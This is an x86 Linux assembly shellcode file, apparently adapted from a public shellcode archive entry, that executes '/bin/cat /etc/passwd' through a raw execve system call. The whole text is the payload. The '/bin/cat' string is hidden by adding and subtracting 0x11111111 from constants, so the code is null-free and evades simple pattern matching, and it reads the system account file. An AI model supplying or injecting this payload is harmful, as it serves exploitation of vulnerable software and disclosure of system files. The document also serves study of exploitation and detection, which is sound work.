; http://shell-storm.org/shellcode/files/shellcode-571.php
; cat /etc/passwd
;

global _start			

section .text
_start:
	xor eax, eax
	cdq
	push edx
	mov esi, 0x6350521E
	add esi, 0x11111111
	push esi
	
	mov esi,  0x7F7A7340
	sub esi, 0x11111111
	push esi
	
	mov ebx,esp
	push edx
	mov esi, 0x64777373
	push esi
	
	mov esi, 0x61702f2f
	push esi
	
	mov esi, 0x6374652f
	push esi

	mov ecx,esp
	mov al, 0xb
	
	push edx
	push ecx
	push ebx
	mov ecx,esp
	int 0x80